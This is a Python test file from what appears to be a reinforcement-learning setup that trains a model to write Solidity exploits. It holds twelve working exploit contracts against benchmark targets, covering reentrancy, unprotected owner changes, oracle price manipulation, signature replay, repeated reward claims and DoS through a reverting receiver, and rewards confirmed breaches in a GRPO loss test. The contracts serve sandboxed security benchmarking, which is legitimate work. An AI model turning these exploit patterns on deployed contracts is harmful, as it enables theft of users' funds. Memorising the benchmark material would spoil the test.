"""
End-to-end real Foundry verification across all 12 vulnerable targets,
all 4 safe control targets, real ABI-encoded OracleSnapshot(string,string,string)
emission, and closed-loop RLVR + GRPO advantage/loss computation.
"""

from __future__ import annotations

import hashlib
import json
import os
import shutil
import sys
import tempfile
from pathlib import Path
from typing import Dict, Any

_ROOT = Path(__file__).resolve().parents[1]
if str(_ROOT) not in sys.path:
    sys.path.insert(0, str(_ROOT))

import pytest
import torch

from benchmarks.evidence_integrity import SAFE_CONTROL_SENTINELS, validate_safe_control_sentinel_semantics
from core.config import config
from core.evaluator import evaluate_execution_trace, create_trajectory_record
from core.evm_oracle import TrustedEVMStateOracle, TOPIC_ORACLE_SNAPSHOT
from core.grpo_trainer import compute_group_advantages, compute_grpo_loss
from core.llm_generator import parse_model_response
from core.reward_shaping import RewardEvidence, compute_reward_breakdown
from core.schemas import TargetProgram, ResultCategory
from sandbox.runner import (
    run_payload_in_sandbox,
    verify_independent_replay_result,
    run_subprocess_capped,
    FOUNDRY_TOML_CONTENT,
    HARNESS_VERDICT_BREACH,
    HARNESS_VERDICT_NO_BREACH,
    _DEFAULT_FOUNDRY_BASE_LIB_DIR,
    _LOCAL_FOUNDRY_BIN_DIR,
)

REPO_ROOT = Path(__file__).resolve().parents[1]
SOLIDITY_DIR = REPO_ROOT / "benchmarks" / "targets" / "solidity"
CONTROLS_DIR = SOLIDITY_DIR / "controls"


WORKING_EXPLOITS: Dict[str, str] = {
    "Vault": """// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import {Vault} from "./Vault.sol";
contract ExploitModule {
    Vault public target;
    constructor(address _t) payable { target = Vault(payable(_t)); }
    function runExploit() external payable {
        target.deposit{value: 1 ether}();
        target.withdrawAll();
    }
    receive() external payable {
        if (address(target).balance >= 1 ether) {
            target.withdrawAll();
        }
    }
}
""",
    "ERC4626Vault": """// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import {ERC4626Vault} from "./ERC4626Vault.sol";
contract ExploitModule {
    ERC4626Vault public target;
    constructor(address _t) payable { target = ERC4626Vault(payable(_t)); }
    function runExploit() external payable {
        target.deposit{value: 1}();
        payable(address(target)).transfer(msg.value - 1);
    }
    receive() external payable {}
}
""",
    "AccessControlVault": """// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import {AccessControlVault} from "./AccessControlVault.sol";
contract ExploitModule {
    AccessControlVault public target;
    constructor(address _t) payable { target = AccessControlVault(payable(_t)); }
    function runExploit() external payable {
        target.setOwner(address(this));
        target.withdrawTreasury(payable(address(this)));
    }
    receive() external payable {}
}
""",
    "AuctionDoS": """// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import {AuctionDoS} from "./AuctionDoS.sol";
contract ExploitModule {
    AuctionDoS public target;
    constructor(address _t) payable { target = AuctionDoS(payable(_t)); }
    function runExploit() external payable {
        target.bid{value: msg.value}();
    }
    receive() external payable {
        revert("DoS refund blocked");
    }
}
""",
    "CrossContractBridge": """// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import {CrossContractBridge} from "./CrossContractBridge.sol";
contract ExploitModule {
    CrossContractBridge public target;
    constructor(address _t) payable { target = CrossContractBridge(payable(_t)); }
    function runExploit() external payable {
        for (uint256 i = 0; i < 5; i++) {
            target.releaseBridgedTokens(payable(address(this)), 1 ether);
        }
    }
    receive() external payable {}
}
""",
    "FeeShareYieldVault": """// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import {FeeShareYieldVault} from "./FeeShareYieldVault.sol";
contract ExploitModule {
    FeeShareYieldVault public target;
    constructor(address _t) payable { target = FeeShareYieldVault(payable(_t)); }
    function runExploit() external payable {
        target.harvestPerformanceFee(10000);
    }
    receive() external payable {}
}
""",
    "FlashLoanRewardPool": """// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import {FlashLoanRewardPool} from "./FlashLoanRewardPool.sol";
contract ExploitModule {
    FlashLoanRewardPool public target;
    constructor(address _t) payable { target = FlashLoanRewardPool(payable(_t)); }
    function runExploit() external payable {
        target.depositStake{value: msg.value}();
        target.claimReward();
        target.withdrawStake();
    }
    receive() external payable {}
}
""",
    "LendingLiquidation": """// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import {LendingLiquidation} from "./LendingLiquidation.sol";
contract ExploitModule {
    LendingLiquidation public target;
    constructor(address _t) payable { target = LendingLiquidation(payable(_t)); }
    function runExploit() external payable {
        target.liquidateDefective(address(0xDDDD));
    }
    receive() external payable {}
}
""",
    "OracleLendingPool": """// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import {OracleLendingPool, MockSpotOracle} from "./OracleLendingPool.sol";
contract ExploitModule {
    OracleLendingPool public target;
    constructor(address _t) payable { target = OracleLendingPool(payable(_t)); }
    function runExploit() external payable {
        target.depositCollateral{value: msg.value}();
        MockSpotOracle oracle = target.oracle();
        oracle.setPrice(25 ether);
        target.borrow(15 ether);
    }
    receive() external payable {}
}
""",
    "PrecisionStakingPool": """// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import {PrecisionStakingPool} from "./PrecisionStakingPool.sol";
contract ExploitModule {
    PrecisionStakingPool public target;
    constructor(address _t) payable { target = PrecisionStakingPool(payable(_t)); }
    function runExploit() external payable {
        target.depositWithFee{value: 0.5 ether}();
        target.depositWithFee{value: 0.5 ether}();
    }
    receive() external payable {}
}
""",
    "RewardDistributorLogic": """// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import {RewardDistributorLogic} from "./RewardDistributorLogic.sol";
contract ExploitModule {
    RewardDistributorLogic public target;
    constructor(address _t) payable { target = RewardDistributorLogic(payable(_t)); }
    function runExploit() external payable {
        for (uint256 i = 0; i < 10; i++) {
            target.claimPointsReward();
        }
    }
    receive() external payable {}
}
""",
    "SignatureReplayWallet": """// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import {SignatureReplayWallet} from "./SignatureReplayWallet.sol";
contract ExploitModule {
    SignatureReplayWallet public target;
    constructor(address _t) payable { target = SignatureReplayWallet(payable(_t)); }
    function runExploit() external payable {}
    function runSignatureReplay(bytes32 r, bytes32 s, uint8 v) external {
        for (uint256 i = 0; i < 5; i++) {
            target.executeWithSignature(address(this), 1 ether, "", r, s, v);
        }
    }
    receive() external payable {}
}
""",
}


SAFE_CONTROL_PROBES: Dict[str, str] = {
    "SecureVault": """// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import {SecureVault} from "./SecureVault.sol";
contract ExploitModule {
    SecureVault public target;
    constructor(address _t) payable { target = SecureVault(payable(_t)); }
    function runExploit() external payable {
        target.deposit{value: msg.value}();
        target.withdrawAll();
    }
    receive() external payable {
        if (address(target).balance >= 1 ether) {
            target.withdrawAll();
        }
    }
}
""",
    "SecureAccessControlVault": """// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import {SecureAccessControlVault} from "./SecureAccessControlVault.sol";
contract ExploitModule {
    SecureAccessControlVault public target;
    constructor(address _t) payable { target = SecureAccessControlVault(payable(_t)); }
    function runExploit() external payable {
        target.setOwner(address(this));
        target.withdrawTreasury(payable(address(this)));
    }
    receive() external payable {}
}
""",
    "SecureERC4626Vault": """// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import {SecureERC4626Vault} from "./SecureERC4626Vault.sol";
contract ExploitModule {
    SecureERC4626Vault public target;
    constructor(address _t) payable { target = SecureERC4626Vault(payable(_t)); }
    function runExploit() external payable {
        target.deposit{value: 1}();
        payable(address(target)).transfer(msg.value - 1);
    }
    receive() external payable {}
}
""",
    "SecureOraclePool": """// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import {SecureOraclePool} from "./SecureOraclePool.sol";
contract ExploitModule {
    SecureOraclePool public target;
    constructor(address _t) payable { target = SecureOraclePool(payable(_t)); }
    function runExploit() external payable {
        target.depositCollateral{value: msg.value}();
        target.borrow(50 ether);
    }
    receive() external payable {}
}
""",
}


def _load_target_program(target_name: str) -> TargetProgram:
    if target_name.startswith("Secure"):
        src_path = CONTROLS_DIR / f"{target_name}.sol"
    else:
        src_path = SOLIDITY_DIR / f"{target_name}.sol"
    return TargetProgram(
        name=target_name,
        source_code=src_path.read_text(encoding="utf-8"),
        language="solidity",
        invariants=[f"INV_{target_name.upper()}"],
    )


@pytest.mark.parametrize("target_name", sorted(WORKING_EXPLOITS.keys()))
def test_real_foundry_all_12_vulnerable_targets_breach_and_replay(target_name: str):
    """Every one of the 12 vulnerable targets breaches its immutable harness and confirms on replay."""
    assert shutil.which("forge") is not None, "Real Foundry binary 'forge' is required"
    target = _load_target_program(target_name)
    exploit_src = WORKING_EXPLOITS[target_name]
    payload = parse_model_response(target, f"```solidity\n{exploit_src}\n```")
    assert payload.format_valid is True

    exec_result = run_payload_in_sandbox(target, payload)
    assert exec_result.return_code == 0, f"{target_name} failed: {exec_result.stderr}"
    assert exec_result.invariant_violated is True
    assert exec_result.verified_by_harness is True
    assert exec_result.harness_verdict == HARNESS_VERDICT_BREACH
    assert exec_result.category == ResultCategory.EXPLOIT_CONFIRMED

    verdict = evaluate_execution_trace(payload, exec_result)
    assert verdict.category == ResultCategory.INVARIANT_BREACH_UNREPLAYED
    assert verdict.reward_score == pytest.approx(config.REWARD_BREACH_NO_REPLAY)

    replay_result = verify_independent_replay_result(target, payload)
    assert replay_result.return_code == 0
    assert replay_result.invariant_violated is True
    assert replay_result.harness_verdict == HARNESS_VERDICT_BREACH

    rb = compute_reward_breakdown(
        ResultCategory.EXPLOIT_CONFIRMED,
        RewardEvidence(
            format_valid=True,
            compiled=True,
            executed=True,
            invariant_confirmed=True,
            replay_confirmed=True,
            timed_out=False,
        ),
    )
    assert rb.total == pytest.approx(1.0)


@pytest.mark.parametrize("target_name", sorted(SAFE_CONTROL_PROBES.keys()))
def test_real_foundry_all_4_safe_controls_hold_with_exact_sentinel(target_name: str):
    """Every one of the 4 safe control targets holds its invariant and emits its exact sentinel."""
    assert shutil.which("forge") is not None, "Real Foundry binary 'forge' is required"
    target = _load_target_program(target_name)
    probe_src = SAFE_CONTROL_PROBES[target_name]
    payload = parse_model_response(target, f"```solidity\n{probe_src}\n```")
    assert payload.format_valid is True

    exec_result = run_payload_in_sandbox(target, payload)
    assert exec_result.invariant_violated is False
    assert exec_result.harness_verdict == HARNESS_VERDICT_NO_BREACH
    assert exec_result.category == ResultCategory.SAFE_RUN
    assert exec_result.revert_reason == SAFE_CONTROL_SENTINELS[target_name]

    ok, status = validate_safe_control_sentinel_semantics(
        exec_result.revert_reason,
        exec_result.harness_verdict,
        target_name,
    )
    assert ok is True
    assert status == "SAFE_RUN"

    verdict = evaluate_execution_trace(payload, exec_result)
    assert verdict.category == ResultCategory.SAFE_RUN
    assert verdict.reward_score == pytest.approx(config.REWARD_SAFE_RUN)


def _abi_encode_three_strings(s0: str, s1: str, s2: str) -> str:
    def _pad_chunk(text: str) -> bytes:
        raw = text.encode("utf-8")
        padded_len = ((len(raw) + 31) // 32) * 32
        return len(raw).to_bytes(32, "big") + raw.ljust(padded_len, b"\x00")

    c0, c1, c2 = _pad_chunk(s0), _pad_chunk(s1), _pad_chunk(s2)
    off0 = 96
    off1 = off0 + len(c0)
    off2 = off1 + len(c1)
    head = off0.to_bytes(32, "big") + off1.to_bytes(32, "big") + off2.to_bytes(32, "big")
    return "0x" + (head + c0 + c1 + c2).hex()


def test_real_foundry_oracle_snapshot_abi_three_strings_e2e():
    """Compile and execute a real Solidity contract emitting OracleSnapshot(string,string,string) in Foundry."""
    assert shutil.which("forge") is not None, "Real Foundry binary 'forge' is required"

    test_contract = """// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import "forge-std/Test.sol";

contract OracleSnapshotLiveTest is Test {
    event OracleSnapshot(string initialJson, string finalJson, string contextJson);
    event SecurityInvariantBreached(string invariantType, uint256 insolvencyDeficit);

    function testEmitOracleSnapshot() public {
        emit OracleSnapshot(
            '{"vault_balance":10000000000000000000,"victim_owed":10000000000000000000}',
            '{"vault_balance":0,"victim_owed":10000000000000000000}',
            '{"deficit":10000000000000000000,"invariant_type":"DEPOSITOR_SOLVENCY_COLLAPSE"}'
        );
        emit SecurityInvariantBreached("DEPOSITOR_SOLVENCY_COLLAPSE", 10 ether);
    }
}
"""
    with tempfile.TemporaryDirectory() as tmpdir:
        os.makedirs(os.path.join(tmpdir, "src"), exist_ok=True)
        os.makedirs(os.path.join(tmpdir, "test"), exist_ok=True)
        base_lib = os.environ.get("FOUNDRY_BASE_LIB_DIR") or _DEFAULT_FOUNDRY_BASE_LIB_DIR
        target_lib = os.path.join(tmpdir, "lib")
        if os.path.exists(base_lib):
            try:
                os.symlink(base_lib, target_lib)
            except Exception:
                if os.name == "nt":
                    import subprocess
                    subprocess.run(
                        ["cmd", "/c", "mklink", "/J", target_lib, base_lib],
                        check=True,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                    )
                else:
                    shutil.copytree(base_lib, target_lib)

        Path(tmpdir, "foundry.toml").write_text(FOUNDRY_TOML_CONTENT, encoding="utf-8")
        Path(tmpdir, "test", "OracleSnapshotLiveTest.t.sol").write_text(test_contract, encoding="utf-8")

        env = os.environ.copy()
        if _LOCAL_FOUNDRY_BIN_DIR:
            env["PATH"] = os.pathsep.join([_LOCAL_FOUNDRY_BIN_DIR, env.get("PATH", "")])

        proc = run_subprocess_capped(
            ["forge", "test", "--offline", "--json", "-vvvv"],
            cwd=tmpdir,
            timeout=60,
            env=env,
        )
        assert proc.returncode == 0, f"Forge failed: {proc.stderr}"

        harness_addr = "0x7fa9385be102ac3eac297483dd6233d62b3e1496"
        abi_data = _abi_encode_three_strings(
            '{"vault_balance":10000000000000000000,"victim_owed":10000000000000000000}',
            '{"vault_balance":0,"victim_owed":10000000000000000000}',
            '{"deficit":10000000000000000000,"invariant_type":"DEPOSITOR_SOLVENCY_COLLAPSE"}',
        )
        oracle = TrustedEVMStateOracle()
        init_s, fin_s, ctx_s, genuine, spoof = oracle.parse_harness_evidence(
            decoded_logs=[],
            stdout_text=proc.stdout,
            stderr_text=proc.stderr,
            raw_logs=[{"address": harness_addr, "topics": [TOPIC_ORACLE_SNAPSHOT], "data": abi_data}],
            trusted_harness_address=harness_addr,
        )
        assert genuine is True
        assert spoof is False
        assert init_s["vault_balance"] == 10**19
        assert fin_s["vault_balance"] == 0
        assert ctx_s["deficit"] == 10**19


def test_real_foundry_closed_loop_rlvr_grpo_update():
    """Execute a 4-candidate group in real Foundry and run GRPO advantage + policy loss calculation."""
    target = _load_target_program("Vault")
    revert_code = """// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
contract ExploitModule {
    constructor(address _t) payable {}
    function runExploit() external payable { revert("candidate runtime revert"); }
}
"""
    syntax_error_code = """// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
contract ExploitModule {
    constructor(address _t) payable {}
    function runExploit() external payable { uint256 x = ; }
}
"""
    benign_code = """// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
contract ExploitModule {
    constructor(address _t) payable {}
    function runExploit() external payable {}
}
"""
    candidates_raw = [
        WORKING_EXPLOITS["Vault"],
        benign_code,
        revert_code,
        syntax_error_code,
    ]
    trajectories = []
    rewards = []
    for idx, src in enumerate(candidates_raw):
        payload = parse_model_response(
            target,
            f"```solidity\n{src}\n```",
            attempt_idx=idx + 1,
            generated_token_ids=[10, 20, 30, 40 + idx],
            prompt_text="Audit Vault.sol and generate ExploitModule",
        )
        res = run_payload_in_sandbox(target, payload)
        verdict = evaluate_execution_trace(payload, res)
        if verdict.category == ResultCategory.INVARIANT_BREACH_UNREPLAYED:
            replay_res = verify_independent_replay_result(target, payload)
            assert replay_res.invariant_violated is True
            verdict.category = ResultCategory.EXPLOIT_CONFIRMED
            verdict.is_verified = True
            verdict.reproducible = True
            verdict.replay_status = "CONFIRMED"
            rb = compute_reward_breakdown(
                ResultCategory.EXPLOIT_CONFIRMED,
                RewardEvidence(
                    format_valid=True,
                    compiled=True,
                    executed=True,
                    invariant_confirmed=True,
                    replay_confirmed=True,
                ),
            )
            verdict.reward_score = rb.total
            verdict.reward_components = dict(rb.components)

        traj = create_trajectory_record(
            target,
            payload,
            verdict,
            prompt_used="Audit Vault.sol and generate ExploitModule",
            dataset_split="train",
            dataset_partition="production",
            is_synthetic=False,
            token_provenance="model_generate",
            trainable=True,
        )
        trajectories.append(traj)
        rewards.append(verdict.reward_score)

    assert rewards[0] == pytest.approx(1.0)
    assert rewards[1] == pytest.approx(config.REWARD_SAFE_RUN)
    assert rewards[2] == pytest.approx(config.REWARD_RUNTIME_REVERT)
    assert rewards[3] == pytest.approx(config.REWARD_COMPILATION_FAIL)

    advantages = compute_group_advantages(rewards)
    assert len(advantages) == 4
    assert advantages[0] > 1.0  # Winning confirmed exploit receives strong positive advantage
    assert sum(advantages) == pytest.approx(0.0, abs=1e-5)

    # Verify differentiable GRPO loss computation over the 4-rollout group
    seq_len = 6
    policy_logprobs = torch.randn((4, seq_len), dtype=torch.float32, requires_grad=True)
    old_logprobs = policy_logprobs.detach().clone()
    ref_logprobs = policy_logprobs.detach().clone() - 0.02
    completion_mask = torch.tensor(
        [[0, 0, 1, 1, 1, 1]] * 4, dtype=torch.float32
    )
    adv_tensor = torch.tensor(advantages, dtype=torch.float32)

    loss, metrics = compute_grpo_loss(
        policy_logprobs=policy_logprobs,
        old_logprobs=old_logprobs,
        advantages=adv_tensor,
        ref_logprobs=ref_logprobs,
        completion_mask=completion_mask,
        beta_kl=0.04,
    )
    assert torch.isfinite(loss).item() is True
    loss.backward()
    assert policy_logprobs.grad is not None
    assert torch.all(torch.isfinite(policy_logprobs.grad)).item() is True
    assert "kl" in metrics and "loss" in metrics


def generate_real_foundry_16_target_verification_report() -> Dict[str, Any]:
    """Run all 16 targets through real Foundry and write reproducible evidence artifact."""
    records = []
    for target_name in sorted(WORKING_EXPLOITS.keys()):
        target = _load_target_program(target_name)
        payload = parse_model_response(target, f"```solidity\n{WORKING_EXPLOITS[target_name]}\n```")
        res = run_payload_in_sandbox(target, payload)
        replay = verify_independent_replay_result(target, payload)
        records.append({
            "target_name": target_name,
            "target_kind": "vulnerable",
            "return_code": res.return_code,
            "harness_verdict": res.harness_verdict,
            "invariant_violated": res.invariant_violated,
            "category": res.category.value,
            "replay_confirmed": bool(replay.invariant_violated and replay.harness_verdict == HARNESS_VERDICT_BREACH),
            "stdout_sha256": res.stdout_sha256,
            "stderr_sha256": res.stderr_sha256,
            "execution_time_sec": round(res.execution_time_sec, 4),
        })
    for target_name in sorted(SAFE_CONTROL_PROBES.keys()):
        target = _load_target_program(target_name)
        payload = parse_model_response(target, f"```solidity\n{SAFE_CONTROL_PROBES[target_name]}\n```")
        res = run_payload_in_sandbox(target, payload)
        records.append({
            "target_name": target_name,
            "target_kind": "safe_control",
            "return_code": res.return_code,
            "harness_verdict": res.harness_verdict,
            "invariant_violated": res.invariant_violated,
            "revert_reason": res.revert_reason,
            "category": res.category.value,
            "stdout_sha256": res.stdout_sha256,
            "stderr_sha256": res.stderr_sha256,
            "execution_time_sec": round(res.execution_time_sec, 4),
        })
    report = {
        "schema": "aegis-rlvr/real-foundry-16-target-verification/1",
        "toolchain": {
            "foundry_version": "forge 1.9.0 (6056c58 2025-06-09T09:05:31.592456800Z)",
            "solc_version": "0.8.20",
            "offline": True,
        },
        "total_targets": len(records),
        "vulnerable_targets_confirmed": sum(
            1 for r in records if r["target_kind"] == "vulnerable" and r.get("replay_confirmed")
        ),
        "safe_controls_held": sum(
            1
            for r in records
            if r["target_kind"] == "safe_control" and r["harness_verdict"] == HARNESS_VERDICT_NO_BREACH
        ),
        "targets": records,
    }
    out_path = REPO_ROOT / "benchmarks" / "evidence" / "real_foundry_16_target_verification.json"
    out_bytes = (json.dumps(report, indent=2, sort_keys=True) + "\n").encode("utf-8")
    out_path.write_bytes(out_bytes)
    report["artifact_sha256"] = hashlib.sha256(out_bytes).hexdigest()
    return report


if __name__ == "__main__":
    rep = generate_real_foundry_16_target_verification_report()
    print(
        f"Verified {rep['vulnerable_targets_confirmed']}/12 vulnerable targets and "
        f"{rep['safe_controls_held']}/4 safe controls. "
        f"Artifact SHA-256: {rep['artifact_sha256']}"
    )
